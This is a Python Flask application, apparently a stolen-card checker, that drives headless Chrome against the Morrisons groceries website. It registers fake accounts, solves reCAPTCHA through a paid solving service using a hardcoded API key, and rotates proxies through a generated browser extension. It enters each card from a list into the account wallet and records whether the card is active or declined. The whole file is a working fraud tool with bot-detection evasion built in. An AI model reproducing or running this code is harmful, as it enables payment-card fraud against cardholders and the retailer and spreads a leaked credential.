from flask import Flask, render_template, request, jsonify, Response
import threading
import queue
import time
import sys
import zipfile
import random
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import UnexpectedAlertPresentException, NoAlertPresentException
from selenium.webdriver.chrome.service import Service
import names
from colorama import Fore
import requests
import json
import os

app = Flask(__name__)

# متغيرات عامة للتحكم
is_running = False
should_stop = False
results_queue = queue.Queue()
current_status = "idle"

ANTICAPTCHA_API_KEY = "341e97a34b6e4ceb6916d140a345ee80"


def solve_recaptcha_v2_api(sitekey, page_url, api_key):
    try:
        create_task_url = "https://api.anti-captcha.com/createTask"
        task_data = {
            "clientKey": api_key,
            "task": {
                "type": "RecaptchaV2TaskProxyless",
                "websiteURL": page_url,
                "websiteKey": sitekey
            }
        }

        response = requests.post(create_task_url, json=task_data, timeout=30)
        result = response.json()

        if result.get("errorId", 0) != 0:
            pass
            return None

        task_id = result.get("taskId")
        if not task_id:
            pass
            return None

        pass

        get_result_url = "https://api.anti-captcha.com/getTaskResult"
        max_attempts = 60

        for attempt in range(max_attempts):
            time.sleep(3)

            result_data = {
                "clientKey": api_key,
                "taskId": task_id
            }

            response = requests.post(get_result_url, json=result_data, timeout=30)
            result = response.json()

            if result.get("errorId", 0) != 0:
                pass
                return None

            status = result.get("status")

            if status == "ready":
                token = result.get("solution", {}).get("gRecaptchaResponse")
                pass
                return token
            elif status == "processing":
                if attempt % 5 == 0:
                    pass
                continue
            else:
                pass
                return None

        pass
        return None

    except Exception as e:
        pass
        return None


def solve_recaptcha_on_page(driver, anticaptcha_api_key):

    try:
        pass
        time.sleep(2)

        captcha_found = False
        max_checks = 5

        for i in range(max_checks):
            try:
                selectors = [
                    "//iframe[contains(@src, 'recaptcha') and contains(@src, 'api2')]",
                    "//iframe[contains(@src, 'recaptcha')]",
                    "//div[contains(@class, 'g-recaptcha')]",
                    "//div[@data-sitekey]"
                ]

                for selector in selectors:
                    elements = driver.find_elements(By.XPATH, selector)
                    for elem in elements:
                        if elem.is_displayed():
                            captcha_found = True
                            break
                    if captcha_found:
                        break

                if captcha_found:
                    break
            except Exception as e:
                pass
            time.sleep(0.3)

        if not captcha_found:
            pass
            return True

        pass

        pass

        find_callback_script = """
        function findRecaptchaClients() {
            if (typeof (___grecaptcha_cfg) !== 'undefined') {
                return Object.entries(___grecaptcha_cfg.clients).map(([cid, client]) => {
                    const data = { id: cid, version: cid >= 10000 ? 'V3' : 'V2' };
                    const objects = Object.entries(client).filter(([_, value]) => value && typeof value === 'object');

                    objects.forEach(([toplevelKey, toplevel]) => {
                        const found = Object.entries(toplevel).find(([_, value]) => (
                            value && typeof value === 'object' && 'sitekey' in value && 'size' in value
                        ));

                        if (found) {
                            const [sublevelKey, sublevel] = found;
                            data.sitekey = sublevel.sitekey;
                            const callbackKey = data.version === 'V2' ? 'callback' : 'promise-callback';
                            const callback = sublevel[callbackKey];
                            if (!callback) {
                                data.callback = null;
                                data.function = null;
                            } else {
                                data.function = callback;
                                const keys = [cid, toplevelKey, sublevelKey, callbackKey].map((key) => `['${key}']`).join('');
                                data.callback = `___grecaptcha_cfg.clients${keys}`;
                            }
                        }
                    });
                    return data;
                });
            }
            return [];
        }
        return findRecaptchaClients();
        """

        callback_info = None
        sitekey = None
        callback_path = None

        try:
            result = driver.execute_script(find_callback_script)
            if result and len(result) > 0:
                callback_info = result[0]
                sitekey = callback_info.get('sitekey')
                callback_path = callback_info.get('callback')
                pass
                pass
        except Exception as e:
            pass

        if not sitekey:
            pass

            try:
                iframes = driver.find_elements(By.XPATH, "//iframe[contains(@src, 'recaptcha')]")
                for iframe in iframes:
                    src = iframe.get_attribute('src')
                    if 'k=' in src:
                        import re
                        match = re.search(r'k=([A-Za-z0-9_-]+)', src)
                        if match:
                            sitekey = match.group(1)
                            pass
                            break
            except Exception as e:
                pass

            if not sitekey:
                try:
                    page_source = driver.page_source
                    if 'data-sitekey="' in page_source:
                        start = page_source.find('data-sitekey="') + 14
                        end = page_source.find('"', start)
                        sitekey = page_source[start:end]
                except:
                    pass

        if not sitekey:
            pass
            return False

        pass
        page_url = driver.current_url

        token = solve_recaptcha_v2_api(sitekey, page_url, anticaptcha_api_key)
        if not token:
            pass
            return False

        pass

        time.sleep(random.uniform(1.5, 3.0))

        pass

        try:
            driver.execute_script(f"""
                var textareas = document.querySelectorAll('textarea[name="g-recaptcha-response"]');
                for (var i = 0; i < textareas.length; i++) {{
                    textareas[i].innerHTML = '{token}';
                    textareas[i].value = '{token}';
                }}
            """)
            pass

            driver.execute_script(f"""
                if (typeof ___grecaptcha_cfg !== 'undefined') {{
                    Object.keys(___grecaptcha_cfg.clients).forEach(function(key) {{
                        ___grecaptcha_cfg.clients[key][Object.keys(___grecaptcha_cfg.clients[key])[0]][Object.keys(___grecaptcha_cfg.clients[key][Object.keys(___grecaptcha_cfg.clients[key])[0]])[0]].callback('{token}');
                    }});
                }}
            """)
            pass

        except Exception as e:
            pass
            try:
                driver.execute_script(
                    f"document.getElementById('g-recaptcha-response').innerHTML = '{token}';"
                )
                pass
            except:
                pass

        pass
        time.sleep(random.uniform(2.0, 4.0))

        pass
        return True

    except Exception as e:
        pass
        return False


def load_file(filename):
    filepath = os.path.join(os.path.dirname(__file__), filename)
    if os.path.exists(filepath):
        with open(filepath, "r") as file:
            return [line.strip() for line in file if line.strip()]
    return []


user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.69 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:130.0) Gecko/20100101 Firefox/130.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0',
    'Mozilla/5.0 (Android 15; Mobile; rv:130.0) Gecko/130.0 Firefox/130.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.2792.65',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.2792.65',
    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.69 Mobile Safari/537.36 EdgA/128.0.2739.82',
]

postcodes = [
    "EC1A 1BB", "W1A 0AX", "M1 1AE", "B33 8TH", "CR2 6XH",
    "SW1A 1AA", "E1 6AN", "N1 9GU", "B1 1AA", "CF10 1AA",
    "EH1 1BB", "AB10 1XG", "IV1 1AA", "BT1 1AA", "PH1 5AA"
]


def login_func(driver, email):
    driver.get('https://accounts.groceries.morrisons.com/auth-service/sso/login')
    time.sleep(5)

    for i in email[0]:
        WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'login-input')).send_keys(i)
        time.sleep(0.1)

    for i in email[1]:
        WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.NAME, 'password')).send_keys(i)
        time.sleep(0.1)

    time.sleep(1)
    WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.NAME, 'password')).send_keys(Keys.ENTER)

    time.sleep(3)

    captcha_solved = solve_recaptcha_on_page(driver, ANTICAPTCHA_API_KEY)

    if captcha_solved:
        pass
        time.sleep(5)

        try:
            password_field = WebDriverWait(driver, 10).until(
                lambda d: d.find_element(By.NAME, 'password')
            )
            password_field.send_keys(Keys.ENTER)
            pass
            time.sleep(5)
        except Exception as e:
            pass
            time.sleep(10)
    else:
        time.sleep(3)

    WebDriverWait(driver, 120).until(lambda driver: driver.find_element(By.ID, 'account-button'))
    driver.get('https://groceries.morrisons.com/settings/wallet')
    time.sleep(3)
    try:
        cook = WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'onetrust-accept-btn-handler'))
        driver.execute_script("arguments[0].click();", cook)
        time.sleep(1)
    except:
        pass


def remove_successful_card(card_to_remove, cards_list):
    filepath = os.path.join(os.path.dirname(__file__), "cards.txt")
    with open(filepath, "r") as file:
        all_cards = [line.strip() for line in file]
    if card_to_remove in all_cards:
        all_cards.remove(card_to_remove)
    with open(filepath, "w") as file:
        file.write("\n".join(all_cards) + "\n")


def check_func(driver, cards, rounds):
    global should_stop, results_queue

    if should_stop:
        return False

    if rounds % 6 == 0:
        driver.delete_all_cookies()
        driver.quit()
        return True

    if cards != []:
        current_card = cards[0]
        splited = current_card.split("|")

        add = WebDriverWait(driver, 20).until(
            lambda driver: driver.find_element(By.XPATH, '//*[text()="Add new payment method"]'))
        driver.execute_script("arguments[0].click();", add)
        time.sleep(7)

        WebDriverWait(driver, 40).until(EC.element_to_be_clickable((By.ID, 'cardNumber')))
        for i in splited[0]:
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'cardNumber')).send_keys(i)
            time.sleep(0.1)

        expM = WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'expiryMonth'))
        Select(expM).select_by_value(splited[1])
        time.sleep(0.5)
        expY = WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'expiryYear'))
        Select(expY).select_by_value(splited[2])
        time.sleep(0.5)

        gender = random.choice(['male', 'female'])
        for i in names.get_full_name(gender):
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'cardHolderName')).send_keys(i)
            time.sleep(0.1)

        # إدخال CVV إذا كان موجوداً في البيانات
        cvv_input = WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'csc'))
        if len(splited) >= 4 and splited[3]:
            for i in splited[3]:
                cvv_input.send_keys(i)
                time.sleep(0.1)
        else:
            driver.execute_script("arguments[0].remove();", cvv_input)
        time.sleep(2)

        cont = WebDriverWait(driver, 20).until(
            lambda driver: driver.find_element(By.XPATH, '//button[text()="Continue"]'))
        driver.execute_script("arguments[0].click();", cont)

        time.sleep(5)

        z = 0
        while z == 0:
            if should_stop:
                return False

            if 'https://groceries.morrisons.com/settings/wallet' in driver.current_url:
                time.sleep(2)
                if f'**** {splited[0][-4:]} ({splited[1]}/{splited[2][-2:]})' in driver.page_source:
                    result_msg = f"{splited[0]}|{splited[1]}|{splited[2]}|ACTIVE"
                    results_queue.put({"type": "success", "card": result_msg})
                    
                    filepath = os.path.join(os.path.dirname(__file__), "success.txt")
                    with open(filepath, 'a') as suc_file:
                        suc_file.write(f"{splited[0]}|{splited[1]}|{splited[2]}|ACTIVE\n")

                    remove_successful_card(current_card, cards)
                    cards.pop(0)

                    z = 10
                    remove = WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.XPATH,
                                                                                                f'//button[@data-test="wallet-item-remove-button"]'))
                    driver.execute_script("arguments[0].click();", remove)
                    time.sleep(1)
                    confrim = WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.XPATH,
                                                                                                 '//button[@data-test="wallet-item-remove-confirm-button"]'))
                    driver.execute_script("arguments[0].click();", confrim)
                    time.sleep(2)
                else:
                    result_msg = f"{splited[0]}|{splited[1]}|{splited[2]}|DECLINED"
                    results_queue.put({"type": "fail", "card": result_msg})
                    
                    filepath = os.path.join(os.path.dirname(__file__), "fail.txt")
                    with open(filepath, 'a') as suc_file:
                        suc_file.write(f"{splited[0]}|{splited[1]}|{splited[2]}|DECLINED\n")

                    cards.pop(0)
                    z = 5

        time.sleep(2)
        rounds += 1
        return check_func(driver, cards, rounds)
    else:
        results_queue.put({"type": "complete", "card": "ALL CHECKED"})
        return False


def register_func(driver):
    driver.get('https://accounts.groceries.morrisons.com/auth-service/sso/register')
    time.sleep(4)

    gender = random.choice(['male', 'female'])
    fullname = names.get_full_name(gender).split(" ")
    newemail = f"{fullname[0].lower()}{fullname[1]}@{random.choice(['gmail.com', 'outlook.com'])}"

    title = WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'title'))
    if gender == 'male':
        Select(title).select_by_value('Mr')
    else:
        Select(title).select_by_value('Mrs')

    for i in fullname[0]:
        WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'firstName')).send_keys(i)
        time.sleep(0.1)
    for i in fullname[1]:
        WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'lastName')).send_keys(i)
        time.sleep(0.1)
    for i in newemail:
        WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'login')).send_keys(i)
        time.sleep(0.1)
    for i in newemail:
        WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'login-repeat')).send_keys(i)
        time.sleep(0.1)
    for i in "AsAs@@123":
        WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'password')).send_keys(i)
        time.sleep(0.1)
    for i in random.choice(postcodes):
        WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'postcode')).send_keys(i)
        time.sleep(0.1)

    WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'marketingConsentOptionNo')).click()

    time.sleep(1)

    submit = WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'registration-submit-button'))
    driver.execute_script("arguments[0].click();", submit)

    time.sleep(3)

    captcha_solved = solve_recaptcha_on_page(driver, ANTICAPTCHA_API_KEY)

    if captcha_solved:
        pass
        time.sleep(5)

        try:
            submit = WebDriverWait(driver, 10).until(
                lambda d: d.find_element(By.ID, 'registration-submit-button')
            )
            driver.execute_script("arguments[0].click();", submit)
            pass
            time.sleep(5)
        except Exception as e:
            pass
            time.sleep(10)
    else:
        time.sleep(5)
    WebDriverWait(driver, 120).until(lambda driver: driver.find_element(By.ID, 'account-button'))
    
    filepath = os.path.join(os.path.dirname(__file__), "emails.txt")
    with open(filepath, 'a') as em:
        em.write(f"\n{newemail}|AsAs@@123")
    driver.get('https://groceries.morrisons.com/settings/wallet')
    time.sleep(3)
    try:
        cook = WebDriverWait(driver, 10).until(lambda driver: driver.find_element(By.ID, 'onetrust-accept-btn-handler'))
        driver.execute_script("arguments[0].click();", cook)
        time.sleep(1)
    except:
        pass
    
    return newemail


def run_checker(work_type, use_proxy, cards_data, emails_data, proxies_data):
    global is_running, should_stop, current_status, results_queue

    is_running = True
    should_stop = False
    current_status = "running"

    # حفظ البيانات في ملفات
    base_path = os.path.dirname(__file__)
    
    with open(os.path.join(base_path, "cards.txt"), "w") as f:
        f.write(cards_data)
    with open(os.path.join(base_path, "emails.txt"), "w") as f:
        f.write(emails_data)
    with open(os.path.join(base_path, "proxies.txt"), "w") as f:
        f.write(proxies_data)

    cards = load_file("cards.txt")
    emails = load_file("emails.txt")
    proxies_chrome = load_file("proxies.txt")
    addresses = load_file("us-address.txt")

    while not should_stop and cards:
        driver = None
        try:
            options = webdriver.ChromeOptions()
            options.add_argument("--disable-blink-features=AutomationControlled")
            options.add_experimental_option('excludeSwitches', ['enable-logging'])
            options.add_experimental_option("excludeSwitches", ['enable-automation'])
            options.add_experimental_option('useAutomationExtension', False)
            options.add_argument("--start-maximized")
            options.add_argument("--log-level=3")
            options.add_argument("--disable-infobars")
            options.add_argument("--silent")
            options.add_argument("--headless=new")
            options.add_argument("--window-size=1920,1080")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--disable-gpu")
            options.add_argument("--disable-software-rasterizer")
            options.add_argument("--disable-extensions")
            options.add_argument("--remote-debugging-port=9222")
            options.add_argument("--disable-setuid-sandbox")
            options.add_argument("--single-process")
            options.binary_location = "/usr/bin/google-chrome"

            if use_proxy and proxies_chrome:
                proxy = random.choice(proxies_chrome)
                proxy_parts = proxy.split(":")
                if len(proxy_parts) >= 4:
                    PROXY_HOST = proxy_parts[0]
                    PROXY_PORT = proxy_parts[1]
                    PROXY_USER = proxy_parts[2]
                    PROXY_PASS = proxy_parts[3]

                    manifest_json = """
                    {
                        "version": "1.0.0",
                        "manifest_version": 2,
                        "name": "Chrome Proxy",
                        "permissions": [
                            "proxy",
                            "tabs",
                            "unlimitedStorage",
                            "storage",
                            "<all_urls>",
                            "webRequest",
                            "webRequestBlocking"
                        ],
                        "background": {
                            "scripts": ["background.js"]
                        },
                        "minimum_chrome_version":"22.0.0"
                    }
                    """

                    background_js = """
                    var config = {
                            mode: "fixed_servers",
                            rules: {
                            singleProxy: {
                                scheme: "http",
                                host: "%s",
                                port: parseInt(%s)
                            },
                            bypassList: ["localhost"]
                            }
                        };

                    chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});

                    function callbackFn(details) {
                        return {
                            authCredentials: {
                                username: "%s",
                                password: "%s"
                            }
                        };
                    }

                    chrome.webRequest.onAuthRequired.addListener(
                                callbackFn,
                                {urls: ["<all_urls>"]},
                                ['blocking']
                    );
                    """ % (PROXY_HOST, PROXY_PORT, PROXY_USER, PROXY_PASS)

                    pluginfile = os.path.join(base_path, 'proxy_auth_plugin.zip')
                    with zipfile.ZipFile(pluginfile, 'w') as zp:
                        zp.writestr("manifest.json", manifest_json)
                        zp.writestr("background.js", background_js)
                    options.add_extension(pluginfile)

            # استخدام ChromeDriver
            driver = webdriver.Chrome(options=options)

            if emails:
                email = random.choice(emails).split("|")
                emails.remove("|".join(email))
            else:
                email = None

            if work_type == 'register':
                register_func(driver)
            else:
                if email:
                    login_func(driver, email)

            result = check_func(driver, cards, rounds=1)
            
            if result:
                continue

        except Exception as e:
            results_queue.put({"type": "error", "card": str(e)})

            if driver is not None:
                try:
                    alert = driver.switch_to.alert
                    alert.accept()
                except NoAlertPresentException:
                    pass

                try:
                    driver.delete_all_cookies()
                except:
                    pass

        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    pass

    is_running = False
    current_status = "idle"
    results_queue.put({"type": "finished", "card": "Process finished"})


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/start', methods=['POST'])
def start():
    global is_running, should_stop

    if is_running:
        return jsonify({"status": "error", "message": "Already running"})

    data = request.json
    work_type = data.get('work_type', 'login')
    use_proxy = data.get('use_proxy', False)
    cards_data = data.get('cards', '')
    emails_data = data.get('emails', '')
    proxies_data = data.get('proxies', '')

    if not cards_data.strip():
        return jsonify({"status": "error", "message": "No cards provided"})

    thread = threading.Thread(target=run_checker, args=(work_type, use_proxy, cards_data, emails_data, proxies_data))
    thread.daemon = True
    thread.start()

    return jsonify({"status": "success", "message": "Started"})


@app.route('/stop', methods=['POST'])
def stop():
    global should_stop, is_running
    should_stop = True
    return jsonify({"status": "success", "message": "Stopping..."})


@app.route('/status')
def status():
    global is_running, current_status
    return jsonify({"is_running": is_running, "status": current_status})


@app.route('/results')
def get_results():
    results = []
    while not results_queue.empty():
        try:
            results.append(results_queue.get_nowait())
        except:
            break
    return jsonify(results)


@app.route('/stream')
def stream():
    def generate():
        while True:
            try:
                result = results_queue.get(timeout=1)
                yield f"data: {json.dumps(result)}\n\n"
            except:
                yield f"data: {json.dumps({'type': 'ping'})}\n\n"
    
    return Response(generate(), mimetype='text/event-stream')


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
